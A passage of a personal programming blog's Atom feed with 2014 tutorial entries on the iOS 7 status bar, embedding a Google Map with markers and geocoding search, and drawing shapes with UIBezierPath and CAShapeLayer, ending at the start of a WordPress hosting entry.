src="/images/posts/2014-06-16-dealing-ios-7-uistatusbar/image-statusbar-2.png" alt="Image cover the status bar"></p><p>Yeaaaaahh…. DONE :)</p><p>You can <a href="https://github.com/jslim89/ios7-statusbar-example/archive/master.zip">download the souce code</a>, or visit my <a href="https://github.com/jslim89/ios7-statusbar-example">GitHub repo</a>. You’re welcome to fork it.</p><p><strong>Any suggestions just comment below</strong></p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/19013975/ios-7-set-status-bar-style-per-view-controller/19014724#19014724">iOS 7 Set status bar style per view controller</a></em></li><li><em><a href="http://stackoverflow.com/questions/19108513/uistatusbarstyle-preferredstatusbarstyle-does-not-work-on-ios-7/19365160#19365160">UIStatusBarStyle PreferredStatusBarStyle does not work on iOS 7</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I have a hard time on dealing with iOS 7 status bar.&lt;/p&gt;
&lt;p&gt;In this example, I will set the status bar for each</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>How to add Google Map to your web page</title>
    <link href="http://jslim.net/blog/2014/06/14/how-to-add-google-map-to-your-web-page/"/>
    <id>http://jslim.net/blog/2014/06/14/how-to-add-google-map-to-your-web-page/</id>
    <published>2014-06-14T22:27:11.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Here is to shows you how can you add google map to your web page by JavaScript <em>(not using iframe)</em>. Besides, you will also learn about searching, and marker dragging.</p><h2 id="1-Obtaining-an-Google-Map-API-key"><a href="#1-Obtaining-an-Google-Map-API-key" class="headerlink" title="1. Obtaining an Google Map API key"></a>1. Obtaining an Google Map API key</h2><p>Just visit <a href="https://developers.google.com/maps/documentation/javascript/tutorial#api_key">this page</a>, it will shows the steps on how to obtain an API key.</p><h2 id="2-Add-a-canvas-to-your-web-page-html"><a href="#2-Add-a-canvas-to-your-web-page-html" class="headerlink" title="2. Add a canvas to your web page (html)"></a>2. Add a canvas to your web page (html)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#map</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;map&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://maps.googleapis.com/maps/api/js?key=&#123;API_KEY&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Map setup</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> latlng = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">LatLng</span>(<span class="number">3.12345</span>, <span class="number">101.12345</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> mapOptions = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">zoom</span>: <span class="number">8</span>, <span class="comment">// set the map zoom level</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">center</span>: latlng, <span class="comment">// set the center region</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">disableDefaultUI</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">zoomControl</span>: <span class="literal">true</span>, <span class="comment">// whether to show the zoom control beside</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">mapTypeId</span>: google.<span class="property">maps</span>.<span class="property">MapTypeId</span>.<span class="property">ROADMAP</span></span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> map = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Map</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;map&#x27;</span>), mapOptions);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Just add the code above to your page, and refresh your browser…tadaaa~ Google Map is appear on your page now.</p><h2 id="2-Add-a-marker-or-pin-to-your-location"><a href="#2-Add-a-marker-or-pin-to-your-location" class="headerlink" title="2. Add a marker (or pin) to your location"></a>2. Add a marker (or pin) to your location</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Map</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;map&#x27;</span>), mapOptions);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD THIS</span></span><br><span class="line"><span class="keyword">var</span> marker = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Marker</span>(&#123;</span><br><span class="line">    <span class="attr">map</span>: map, <span class="comment">// refer to the map you&#x27;ve just initialise</span></span><br><span class="line">    <span class="attr">position</span>: latlng, <span class="comment">// set the marker position (is based on latitude &amp; longitude)</span></span><br><span class="line">    <span class="attr">draggable</span>: <span class="literal">true</span> <span class="comment">// allow user to drag the marker</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now, add the block of code after <code>var map = ...</code>. Then refresh your browser again, then you will see</p><p><img src="/images/posts/2014-06-15-how-to-add-google-map-to-your-web-page/map.png" alt="Google map with marker"></p><p>You can even customize your marker</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> marker = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Marker</span>(&#123;</span><br><span class="line">    <span class="attr">map</span>: map,</span><br><span class="line">    <span class="attr">position</span>: latlng,</span><br><span class="line">    <span class="attr">draggable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;https://maps.google.com/mapfiles/kml/shapes/schools_maps.png&#x27;</span> <span class="comment">// ADD THIS</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Just add one more line, you will see a different marker. Replace the <code>icon</code> URL to any URL that you want to show.</p><h2 id="3-Add-a-search-function"><a href="#3-Add-a-search-function" class="headerlink" title="3. Add a search function"></a>3. Add a search function</h2><p>Add a search input above the map <em>(or anywhere your prefer)</em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ADD THIS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;address&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Address&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;map&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Then add an event handler, so that when user hit <code>&lt;ENTER&gt;</code> key, it search</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> marker = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Marker</span>(&#123;</span><br><span class="line">    <span class="attr">map</span>: map,</span><br><span class="line">    <span class="attr">position</span>: latlng,</span><br><span class="line">    <span class="attr">draggable</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD LINES BELOW</span></span><br><span class="line"><span class="comment">// add an event handler</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;address&#x27;</span>).<span class="property">onkeyup</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">13</span>) &#123; <span class="comment">// keyCode 13 represent &lt;ENTER&gt; key</span></span><br><span class="line">        <span class="title function_">geocoding</span>(<span class="variable language_">this</span>.<span class="property">value</span>); <span class="comment">// get the value from address text box and pass to the search function</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> geocoder = <span class="keyword">new</span> google.<span class="property">maps</span>.<span class="title class_">Geocoder</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">geocoding</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">    geocoder.<span class="title function_">geocode</span>(&#123;<span class="attr">address</span>: keyword&#125;, <span class="keyword">function</span>(<span class="params">results, status</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(status == google.<span class="property">maps</span>.<span class="property">GeocoderStatus</span>.<span class="property">OK</span>) &#123; <span class="comment">// if got results</span></span><br><span class="line">            <span class="comment">// always take the first result only</span></span><br><span class="line">            map.<span class="title function_">setCenter</span>(results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>); <span class="comment">// set the map region to center</span></span><br><span class="line">            marker.<span class="title function_">setPosition</span>(results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>); <span class="comment">// change the marker position</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if no result, just alert user</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;Location not found.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-What-if-you-want-to-keep-the-latitude-amp-longitude"><a href="#4-What-if-you-want-to-keep-the-latitude-amp-longitude" class="headerlink" title="4. What if you want to keep the latitude &amp; longitude?"></a>4. What if you want to keep the latitude &amp; longitude?</h2><p>Add 2 more inputs after search box <em>(or anywhere you prefer)</em>. In this case use a text box, just for you to see, usually end user don’t want to see this kind of data, is better to keep it hidden. <em>(e.g. <code>&lt;input type=&quot;hidden&quot; id=&quot;lat&quot; value=&quot;3.1234&quot; /&gt;</code>)</em></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;address&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Address&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ADD THIS --&gt;</span></span><br><span class="line">Lat: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lat&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3.1234&quot;</span>/&gt;</span></span><br><span class="line">Lng: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lng&quot;</span> <span class="attr">value</span>=<span class="string">&quot;101.1234&quot;</span>/&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now, you want to set the latitude &amp; longitude when:</p><ul><li>user drag the marker</li><li>user search by address</li></ul><h3 id="User-drag-the-marker"><a href="#User-drag-the-marker" class="headerlink" title="User drag the marker"></a>User drag the marker</h3><p>Add an event handler to the marker.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">geocoding</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD THIS</span></span><br><span class="line">google.<span class="property">maps</span>.<span class="property">event</span>.<span class="title function_">addListener</span>(marker, <span class="string">&#x27;dragend&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// it will run this only if user DROP the marker down (drag end)</span></span><br><span class="line">    <span class="keyword">var</span> position = marker.<span class="title function_">getPosition</span>();</span><br><span class="line">    <span class="comment">// set the position value to text boxes</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;lat&#x27;</span>).<span class="property">value</span> = position.<span class="title function_">lat</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;lng&#x27;</span>).<span class="property">value</span> = position.<span class="title function_">lng</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="User-search-by-address"><a href="#User-search-by-address" class="headerlink" title="User search by address"></a>User search by address</h3><p>Just now we already add an event handler to search remember? Now just add some code to <code>geocoding</code> function</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">geocoding</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">    geocoder.<span class="title function_">geocode</span>(&#123;<span class="attr">address</span>: keyword&#125;, <span class="keyword">function</span>(<span class="params">results, status</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(status == google.<span class="property">maps</span>.<span class="property">GeocoderStatus</span>.<span class="property">OK</span>) &#123;</span><br><span class="line">            map.<span class="title function_">setCenter</span>(results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>);</span><br><span class="line">            marker.<span class="title function_">setPosition</span>(results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ADD THIS</span></span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;lat&#x27;</span>).<span class="property">value</span> = results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>.<span class="title function_">lat</span>();</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;lng&#x27;</span>).<span class="property">value</span> = results[<span class="number">0</span>].<span class="property">geometry</span>.<span class="property">location</span>.<span class="title function_">lng</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;Location not found.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-You-are-done-See-the-result-for-illustration-purpose-only"><a href="#5-You-are-done-See-the-result-for-illustration-purpose-only" class="headerlink" title="5. You are done. See the result (for illustration purpose only)"></a>5. You are done. See the result <em>(for illustration purpose only)</em></h2><style>#map img { max-width: none; }</style><p>Lat: <input type="text" id="lat" value="3.1234" class="form-control"/><br>Lng: <input type="text" id="lng" value="101.1234" class="form-control"/></p><div id="map" style="height: 400px;"></div><script src="https://maps.googleapis.com/maps/api/js"></script><script>var latlng = new google.maps.LatLng(3.12345, 101.12345);var mapOptions = {    zoom: 8,    center: latlng,    disableDefaultUI: true,    zoomControl: true,    mapTypeId: google.maps.MapTypeId.ROADMAP};var map = new google.maps.Map(document.getElementById('map'), mapOptions);var marker = new google.maps.Marker({    map: map,    position: latlng,    draggable: true,    icon: 'http://jslim89.github.com/images/posts/2014-06-15-how-to-add-google-map-to-your-web-page/marker-js-mini.png'});var geocoder = new google.maps.Geocoder();function SearchControl() {    var text = $('<input type="text" class="input-text form-control" placeholder="Search..." style="width:200px;" />');    $(text).keypress(function(e){        if(e.keyCode == 13) {            geocoding(text.val());            return false;        }    }).focus(function(){        $(this).select();    });    return text.get(0);}function geocoding(keyword) {    geocoder.geocode({address: keyword}, function(results, status) {        if(status == google.maps.GeocoderStatus.OK) {            map.setCenter(results[0].geometry.location);            marker.setPosition(results[0].geometry.location);            document.getElementById('lat').value = results[0].geometry.location.lat();            document.getElementById('lng').value = results[0].geometry.location.lng();        } else {            alert('Location not found.');        }    });}map.controls[google.maps.ControlPosition.TOP_RIGHT].push(new SearchControl());google.maps.event.addListener(marker, 'dragend', function() {    var position = marker.getPosition();    document.getElementById('lat').value = position.lat();    document.getElementById('lng').value = position.lng();});</script><p><em>References:</em></p><ul><li><em><a href="https://developers.google.com/maps/tutorials/customizing/custom-markers">Customizing Google Maps: Custom Markers</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Here is to shows you how can</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="google-map" scheme="http://jslim.net/tags/google-map/"/>
    
  </entry>
  
  <entry>
    <title>Draw a shape using UIBezierPath</title>
    <link href="http://jslim.net/blog/2014/06/13/draw-a-shape-using-uibezierpath/"/>
    <id>http://jslim.net/blog/2014/06/13/draw-a-shape-using-uibezierpath/</id>
    <published>2014-06-13T06:59:27.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/posts/2014-06-13-draw-a-shape-using-uibezierpath/shape.png" alt="Shape wanted"></p><p>To draw the shape above by <code>UIBezierPath</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">CGFloat</span> thickness = <span class="number">13</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">CGFloat</span> shapeSize = <span class="number">43</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="built_in">CGPoint</span> startingPoint = <span class="built_in">CGPointMake</span>(<span class="number">50</span>, <span class="number">50</span>); <span class="comment">// top-left corner</span></span><br><span class="line"><span class="built_in">CGPoint</span> points[<span class="number">6</span>];</span><br><span class="line">points[<span class="number">0</span>] = startingPoint;</span><br><span class="line">points[<span class="number">1</span>] = <span class="built_in">CGPointMake</span>(points[<span class="number">0</span>].x + shapeSize, points[<span class="number">0</span>].y);</span><br><span class="line">points[<span class="number">2</span>] = <span class="built_in">CGPointMake</span>(points[<span class="number">0</span>].x + shapeSize, points[<span class="number">0</span>].y + thickness);</span><br><span class="line">points[<span class="number">3</span>] = <span class="built_in">CGPointMake</span>(points[<span class="number">0</span>].x + thickness, points[<span class="number">0</span>].y + thickness);</span><br><span class="line">points[<span class="number">4</span>] = <span class="built_in">CGPointMake</span>(points[<span class="number">0</span>].x + thickness, points[<span class="number">0</span>].y + shapeSize);</span><br><span class="line">points[<span class="number">5</span>] = <span class="built_in">CGPointMake</span>(points[<span class="number">0</span>].x, points[<span class="number">0</span>].y + shapeSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="built_in">CGMutablePathRef</span> cgPath = <span class="built_in">CGPathCreateMutable</span>();</span><br><span class="line"><span class="built_in">CGPathAddLines</span>(cgPath, &amp;<span class="built_in">CGAffineTransformIdentity</span>, points, <span class="keyword">sizeof</span> points / <span class="keyword">sizeof</span> *points);</span><br><span class="line"><span class="built_in">CGPathCloseSubpath</span>(cgPath);</span><br><span class="line"></span><br><span class="line"><span class="built_in">UIBezierPath</span> *path = [<span class="built_in">UIBezierPath</span> bezierPathWithCGPath:cgPath];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="built_in">CAShapeLayer</span> *shape = [<span class="built_in">CAShapeLayer</span> layer];</span><br><span class="line">shape.path = path.CGPath;</span><br><span class="line">shape.fillColor = [<span class="built_in">UIColor</span> colorWithRed:<span class="number">255</span>/<span class="number">255.0</span> green:<span class="number">20</span>/<span class="number">255.0</span> blue:<span class="number">147</span>/<span class="number">255.0</span> alpha:<span class="number">1</span>].CGColor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5</span></span><br><span class="line">[<span class="keyword">self</span>.view.layer addSublayer:shape];</span><br></pre></td></tr></table></figure><ol><li>Define the <em>thickness</em> &amp; it’s <em>size</em> <em>(see the description on that image)</em></li><li>Let say your starting point is in position <code>&#123;50, 50&#125;</code> and you have 6 points in this shape <em>(you can map the index with the image above)</em></li><li>Convert the points to <code>CGPath</code> then add to bezier path</li><li>Then set the bezier path to the <code>CAShapeLayer</code> and fill it with color</li><li>Add to your <code>UIView</code>‘s layer as sublayer</li></ol><p><em>Reference:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/13528898/how-can-i-draw-an-arrow-using-core-graphics/13559449#13559449">How can I draw an arrow using Core Graphics?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/posts/2014-06-13-draw-a-shape-using-uibezierpath/shape.png&quot; alt=&quot;Shape wanted&quot;&gt;&lt;/p&gt;
&lt;p&gt;To draw the shape above by</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>UIView fill with color and leave a empty square in center</title>
    <link href="http://jslim.net/blog/2014/06/13/uiview-fill-with-color-and-leave-a-empty-square-in-center/"/>
    <id>http://jslim.net/blog/2014/06/13/uiview-fill-with-color-and-leave-a-empty-square-in-center/</id>
    <published>2014-06-13T06:37:38.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/posts/2014-06-13-uiview-fill-with-color-and-leave-a-empty-square-in-center/uiview.png" alt="UIView"></p><p>Create a UIView that fill with color, and leave an empty in center.</p><p>This can be accomplish by using <code>CAShapeLayer</code>.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="built_in">UIBezierPath</span> *overlayPath = [<span class="built_in">UIBezierPath</span> bezierPathWithRect:<span class="keyword">self</span>.view.bounds];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="built_in">UIBezierPath</span> *transparentPath = [<span class="built_in">UIBezierPath</span> bezierPathWithRect:<span class="built_in">CGRectMake</span>(<span class="number">60</span>, <span class="number">120</span>, <span class="number">200</span>, <span class="number">200</span>)];</span><br><span class="line">[overlayPath appendPath:transparentPath];</span><br><span class="line">[overlayPath setUsesEvenOddFillRule:<span class="literal">YES</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="built_in">CAShapeLayer</span> *fillLayer = [<span class="built_in">CAShapeLayer</span> layer];</span><br><span class="line">fillLayer.path = overlayPath.CGPath;</span><br><span class="line">fillLayer.fillRule = kCAFillRuleEvenOdd;</span><br><span class="line">fillLayer.fillColor = [<span class="built_in">UIColor</span> colorWithRed:<span class="number">255</span>/<span class="number">255.0</span> green:<span class="number">20</span>/<span class="number">255.0</span> blue:<span class="number">147</span>/<span class="number">255.0</span> alpha:<span class="number">1</span>].CGColor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">[<span class="keyword">self</span>.view.layer addSublayer:fillLayer];</span><br></pre></td></tr></table></figure><ol><li>Initialize a bezier path filled with the whole UIView</li><li>Create another bezier path to represent the rectangle inside. Then merge the inner rectangle to the outer rectangle.<br>For <a href="https://developer.apple.com/library/ios/documentation/uikit/reference/UIBezierPath_class/Reference/Reference.html#//apple_ref/occ/instp/UIBezierPath/usesEvenOddFillRule">usesEvenOddFillRule</a> you can read more in apple doc</li><li>Create a layer <em>(<code>CAShapeLayer</code> is subclass of <code>CALayer</code>)</em>, set the path create just now to the layer, then fill it with a color <em>(put whatever color that you like)</em></li><li>Add the layer to the UIView layer <em>(by default, all <code>UIView</code>s come with a layer)</em></li></ol><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/24196784/uiview-with-transparent-in-middle/24197290#24197290">UIView with transparent in middle</a></em></li><li><em><a href="http://stackoverflow.com/questions/16512761/calayer-with-transparent-hole-in-it/16518739#16518739">CALayer with transparent hole in it</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/posts/2014-06-13-uiview-fill-with-color-and-leave-a-empty-square-in-center/uiview.png&quot; alt=&quot;UIView&quot;&gt;&lt;/p&gt;
&lt;p&gt;Create a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Setup Wordpress on shared hosting</title>
    <link href="http://jslim.net/blog/2014/06/12/setup-wordpress-on-shared-hosting/"/>
    <id>http://jslim.net/blog/2014/06/12/setup-wordpress-on-shared-hosting/</id>
    <published>2014-06-12T05:38:06.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
